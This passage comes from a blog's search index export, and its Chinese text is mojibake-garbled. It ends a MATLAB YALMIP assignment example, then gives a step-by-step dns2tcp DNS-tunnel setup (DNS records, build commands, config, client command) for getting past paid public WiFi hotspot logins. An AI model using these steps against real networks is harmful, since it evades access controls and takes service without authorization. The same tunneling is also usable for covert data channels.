class="comment">%æˆæœ¬çŸ©é˜µ</span></span><br><span class="line">work=[<span class="number">9</span>,<span class="number">6</span>,<span class="number">2</span>;<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>;<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>];</span><br><span class="line"><span class="comment">%é™åˆ¶æ¡ä»¶,æ¯äººåªèƒ½åšä¸€ä»½å·¥ä½œ</span></span><br><span class="line">F=[sum(x)==<span class="number">1</span>];</span><br><span class="line"><span class="comment">%ç›®æ ‡å‡½æ•°,æ€»èŠ±è´¹æœ€å°</span></span><br><span class="line">obj=sum(sum(x.*work));</span><br><span class="line"><span class="comment">%å¯åŠ¨æ±‚è§£å™¨</span></span><br><span class="line">optimize(F,obj);</span><br><span class="line"><span class="comment">%è·å–ç»“æœ</span></span><br><span class="line">optx=value(x)</span><br><span class="line">optObj=value(obj)</span><br></pre></td></tr></table></figure></p><p>ç»“æœå¦‚ä¸‹:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">optx =</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line"> <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span></span><br><span class="line"> <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line"></span><br><span class="line">optObj =</span><br><span class="line"> <span class="number">8</span></span><br></pre></td></tr></table></figure></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>YALMIPè®©æˆ‘ä»¬ç”¨MATLABè¯­è¨€æ–¹ä¾¿åœ°è°ƒç”¨ä¸“ä¸šçš„æ±‚è§£å™¨,è€Œå€ŸåŠ©äºMATLABè‡ªå¸¦çš„ä¸€äº›å‡½æ•°,æˆ‘ä»¬å¯ä»¥æ›´å®¹æ˜“çš„è§£å†³å„ç§è§„åˆ’é—®é¢˜.</p><p>ä½†æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„,MATLABçš„è¯­æ³•è™½å¥½ç”¨,ä½†ä¹Ÿä¸æ˜¯æ‰€æœ‰å‡½æ•°éƒ½å¯ä»¥ä¸YALMIPç»“åˆ,ä¾‹å¦‚ç¥ç»ç½‘ç»œ,æ¨¡æ‹Ÿé€€ç«çš„å‡½æ•°æ˜¯ä¸å¯ä»¥å½“åšé™åˆ¶å‡½æ•°æˆ–é™åˆ¶æ¡ä»¶å‚ä¸è§„åˆ’çš„.</p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§„åˆ’ </tag>
            
            <tag> çº¦æŸæ±‚è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSéš§é“â€”â€”ç»•è¿‡å…¬å…± Wifi çƒ­ç‚¹ç™»é™†å…è´¹ä¸Šç½‘</title>
      <link href="/%E7%BD%91%E7%BB%9C%E5%B1%82-DNS%E9%9A%A7%E9%81%93%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87%E5%85%AC%E5%85%B1-Wifi-%E7%83%AD%E7%82%B9%E7%99%BB%E9%99%86%E5%AE%9E%E7%8E%B0%E5%85%8D%E8%B4%B9%E4%B8%8A%E7%BD%91/"/>
      <url>/%E7%BD%91%E7%BB%9C%E5%B1%82-DNS%E9%9A%A7%E9%81%93%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87%E5%85%AC%E5%85%B1-Wifi-%E7%83%AD%E7%82%B9%E7%99%BB%E9%99%86%E5%AE%9E%E7%8E%B0%E5%85%8D%E8%B4%B9%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p><strong>å£°æ˜ï¼šæ­¤æ–¹æ³•ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿï¼ï¼ï¼</strong></p><p>è¿™æ˜¯ä¸€ä¸ª15å¹´çš„åšæ–‡äº†ï¼Œå› ä¸ºè¿™ä¸¤å¹´DNSå¸¦å¤–æ•°æ®çš„ç ”ç©¶æ¯”è¾ƒç«ï¼Œå› æ­¤å°†æ­¤æ–‡ä»æ—§çš„åšå®¢æ¬è¿æ¥ã€‚</p><h1 id="DNSéš§é“å®ç°åŸç†"><a href="#DNSéš§é“å®ç°åŸç†" class="headerlink" title="DNSéš§é“å®ç°åŸç†"></a>DNSéš§é“å®ç°åŸç†</h1><p>å¸¸è§çš„çƒ­ç‚¹éƒ½éœ€è¦ç™»å½•æ‰èƒ½å¤Ÿä¸Šç½‘, è€Œæä¾›çƒ­ç‚¹çš„ISPå¯¹çƒ­ç‚¹çš„DNSæŸ¥è¯¢æœåŠ¡å¹¶ä¸ä½œé™åˆ¶, è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨åˆ©ç”¨DNSæŸ¥è¯¢æœºåˆ¶ä¼ é€’ä¿¡æ¯.</p><a id="more"></a><p>ä¹Ÿå°±æ˜¯è¯´, å¦‚æœæˆ‘ä»¬çš„è¯·æ±‚æ•°æ®åŒ…ä¸­çš„æ•°æ®, ä¸å«è¿‡æ»¤è§„åˆ™æ—¶, æœ‰é™åˆ¶çš„ISPæˆ–è€…é˜²ç«å¢™åˆ™ä¸ä¼šè¿›è¡Œä¸¢åŒ…å¤„ç†.</p><p>æ‰€ä»¥, æˆ‘ä»¬åœ¨å‘èµ·è¯·æ±‚æ—¶, å°†è¯·æ±‚æ•°æ®åŒ…å†…å®¹é€šè¿‡æ ‡å‡†çš„DNSåè®®è¿›è¡ŒåŠ å¯†, æ ‡è®°è§£æè¯·æ±‚çš„DNSåœ°å€, åˆ™æœ‰é™åˆ¶çš„ISPåœ¨è§£æå®¢æˆ·ç«¯å‘èµ·çš„åŸŸåè¯·æ±‚æ—¶, æ— æ³•è¯†åˆ«åœ°å€, è€Œå»æŒ‡å®šçš„DNSæœåŠ¡å™¨ä¸Šè¿›è¡Œè¯·æ±‚æŸ¥è¯¢. æ­¤æ—¶, æˆ‘ä»¬åœ¨æŒ‡å®šçš„DNSæœåŠ¡å™¨ä¸Šè¿›è¡Œæ•°æ®åŒ…è§£å¯†.</p><p>å†å°†æŸ¥è¯¢å†…å®¹è¿”å›. æ­¤æ—¶, æœ‰é™åˆ¶çš„ISPæˆ–è€…é˜²ç«å¢™ä¼šå†æ¬¡æ£€æµ‹å†…å®¹æ˜¯å¦ä¸ºéè®¤è¯çŠ¶æ€, å¦‚æœæ˜¯éè®¤è¯çŠ¶æ€, åˆ™å°†æŸ¥è¯¢ç»“æœå†…å®¹è¿›è¡Œä¸¢åŒ…å¤„ç†.</p><p>æ‰€ä»¥, åœ¨ç‰¹å®šçš„DNSæœåŠ¡å™¨ä¸Š, æˆ‘ä»¬éœ€è¦å°†ç»“æœè¿›è¡Œæ ‡å‡†DNSåè®®åŠ å¯†è¿”å›å®¢æˆ·ç«¯. æ­¤æ—¶ISPæ— æ³•è¯†åˆ«ç»“æœ, è€Œç›´æ¥è¿”å›å®¢æˆ·ç«¯è¿›è¡Œè§£å¯†å¤„ç†. è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†ä¸€æ¬¡DNSéš§é“è¯·æ±‚, è€Œå®Œå…¨ç»•è¿‡çš„ISPæœåŠ¡å•†çš„è®¤è¯.</p><h1 id="å»ºç«‹DNSéš§é“çš„ç¯å¢ƒéœ€æ±‚"><a href="#å»ºç«‹DNSéš§é“çš„ç¯å¢ƒéœ€æ±‚" class="headerlink" title="å»ºç«‹DNSéš§é“çš„ç¯å¢ƒéœ€æ±‚"></a>å»ºç«‹DNSéš§é“çš„ç¯å¢ƒéœ€æ±‚</h1><ol><li>å¯ä»¥è¿æ¥æœ‰é™åˆ¶çš„ISPæœåŠ¡å•†, æ¯”å¦‚è¿æ¥CMCCçš„æ— çº¿çƒ­ç‚¹</li><li>éœ€è¦ä¸€å°æ‹¥æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨</li><li>DNSéš§é“å·¥å…·, ç”¨æ¥æä¾›å®¢æˆ·ç«¯, æœåŠ¡å™¨é€šä¿¡åŠ è§£å¯†æ“ä½œ, ä»¥ä¸‹æ€»ç»“å‡ ä¸ªæµè¡Œçš„å·¥å…·:<ul><li>tcp-over-dns <a href="http://analogbit.com/software/tcp-over-dns/" target="_blank" rel="noopener">http://analogbit.com/software/tcp-over-dns/</a></li><li>dns2tcp <a href="http://www.hsc.fr/ressources/outils/dns2tcp/" target="_blank" rel="noopener">http://www.hsc.fr/ressources/outils/dns2tcp/</a></li><li>iodine <a href="http://code.kryo.se/iodine/" target="_blank" rel="noopener">http://code.kryo.se/iodine/</a></li></ul></li><li>å®¢æˆ·ç«¯ä»£ç†å·¥å…·</li></ol><h1 id="å®æˆ˜æ“ä½œ"><a href="#å®æˆ˜æ“ä½œ" class="headerlink" title="å®æˆ˜æ“ä½œ"></a>å®æˆ˜æ“ä½œ</h1><p>æœ¬æ¬¡é…ç½®çš„æœåŠ¡å™¨ç¯å¢ƒä¸º CentOS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ28hcmbsi9Z ~]# cat /etc/issue</span><br><span class="line">CentOS release 6.3 (Final)</span><br><span class="line">Kernel \r on an \m</span><br></pre></td></tr></table></figure><h2 id="ä¸ºæœåŠ¡å™¨æ·»åŠ Aè®°å½•å’ŒNSè®°å½•"><a href="#ä¸ºæœåŠ¡å™¨æ·»åŠ Aè®°å½•å’ŒNSè®°å½•" class="headerlink" title="ä¸ºæœåŠ¡å™¨æ·»åŠ Aè®°å½•å’ŒNSè®°å½•"></a>ä¸ºæœåŠ¡å™¨æ·»åŠ Aè®°å½•å’ŒNSè®°å½•</h2><blockquote><p>a.abc.xyz NS b.abc.xyz<br>b.abc.xyz A 1.2.3.4 (å¡«ä½ çš„æœåŠ¡å™¨IP, è¿™é‡Œç”¨ 1.2.3.4 ä¸ºä¾‹)</p></blockquote><h2 id="é…ç½®DNSå·¥å…·æœåŠ¡ç«¯"><a href="#é…ç½®DNSå·¥å…·æœåŠ¡ç«¯" class="headerlink" title="é…ç½®DNSå·¥å…·æœåŠ¡ç«¯"></a>é…ç½®DNSå·¥å…·æœåŠ¡ç«¯</h2><p>è¿™é‡Œæˆ‘ä»¬é€‰ç”¨ DNS2TCP ä¸ºä¾‹<br>åœ¨æœåŠ¡å™¨ä¸Šå®‰è£… DNS2TCP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.hsc.fr/ressources/outils/dns2tcp/download/dns2tcp-0.5.2.tar.gz</span><br><span class="line">tar zxf dns2tcp-0.5.2.tar.gz</span><br><span class="line">cd dns2tcp-0.5.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>åœ¨ /etc å»ºç«‹ä¸€ä¸ªåä¸º dns2tcpd.conf çš„æ–‡ä»¶, ç„¶åè¾“å…¥ä»¥ä¸‹é…ç½®:</p><blockquote><p>listen = 1.2.3.4ï¼ˆLinuxæœåŠ¡å™¨çš„IPï¼‰<br>port = 53<br>user = nobody<br>chroot = /tmp<br>domain = a.abc.xyzï¼ˆä¸Šé¢é…ç½®NSè®°å½•çš„åŸŸåï¼‰<br>resources = ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:3128</p></blockquote><p>æœ€åçš„ resources é‡Œé¢é…ç½®çš„æ˜¯ dns2tcp ä¾›å®¢æˆ·ç«¯ä½¿ç”¨çš„èµ„æºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™å°æœåŠ¡å™¨å…è®¸å°†22ç«¯å£ï¼ˆsshæœåŠ¡ï¼‰ï¼Œ1082ç«¯å£ï¼ˆsocksæœåŠ¡ï¼‰å’Œ3128ï¼ˆhttpæœåŠ¡ï¼‰è½¬æ¢æˆ</p><p>æœåŠ¡ç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ dns2tcp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcpd.conf -F -d 2</span><br></pre></td></tr></table></figure><blockquote><p>-f è¯»å–é…ç½®æ–‡ä»¶<br>-F å¼ºåˆ¶å‰å°è¿è¡Œ<br>-d 2 å¼€å¯debug, ç­‰çº§ä¸º2</p></blockquote><p><strong>åˆ°æ­¤ä¸ºæ­¢,æœåŠ¡ç«¯é…ç½®å®Œæˆ</strong></p><h2 id="é…ç½®DNSå·¥å…·å®¢æˆ·ç«¯"><a href="#é…ç½®DNSå·¥å…·å®¢æˆ·ç«¯" class="headerlink" title="é…ç½®DNSå·¥å…·å®¢æˆ·ç«¯"></a>é…ç½®DNSå·¥å…·å®¢æˆ·ç«¯</h2><p>dns2tcp çš„å®¢æˆ·ç«¯é…ç½®è¾ƒä¸ºç®€å•, ä¸€æ¡å‘½ä»¤å°±è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc -r ssh -z a.abc.xyz 1.2.3.4 -l 8888 -d 2</span><br></pre></td></tr></table></figure><blockquote><p>-r åæ¥æœåŠ¡åç§°, è¿™é‡Œæˆ‘ä»¬ç”¨ssh<br>-z åæ¥NSè®°å½•çš„ç½‘å€, ip, <strong>æ³¨æ„IPåœ°å€æœ€å¥½å†™ä¸Š, å¯ä»¥ä¸å†™</strong><br>-l åæ¥æœ¬åœ°ç«¯å£<br>-d å¼€å¯ Debug</p></blockquote><p>æ³¨æ„æœ¬åœ°éœ€è¦å®‰è£… dns2tcp å·¥å…·.</p><p><strong>åˆ°æ­¤ä¸ºæ­¢, æœåŠ¡ç«¯é…ç½®å®Œæˆ</strong></p><p>å¯ä»¥ç”¨SSHæµ‹è¯•ä¸€ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1:8888</span><br></pre></td></tr></table></figure><p>è¿é€šçš„è¯å°±è¯´æ˜ dns2tcp æˆåŠŸäº†, å¯ä»¥ç›´æ¥ç”¨SSHé€šé“å»ºç«‹ä»£ç†ä¸Šç½‘, å®¢æˆ·ç«¯ Chrome å†ç”¨ SwitchOmega æ¥å…¥,ä¹Ÿå¯ä»¥åœ¨å®¢æˆ·ç«¯é‚£å†™ http æˆ– Socks æœåŠ¡, å‰ææ˜¯æœåŠ¡å™¨é‚£è¦æœ‰å¯¹åº”æœåŠ¡ (å¯ä»¥æ‰¾ <em>Kingate æ¶è®¾ http å’Œ Socks5 ä»£ç†</em> çš„æ–‡ç« )</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå±‚å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNSéš§é“ </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
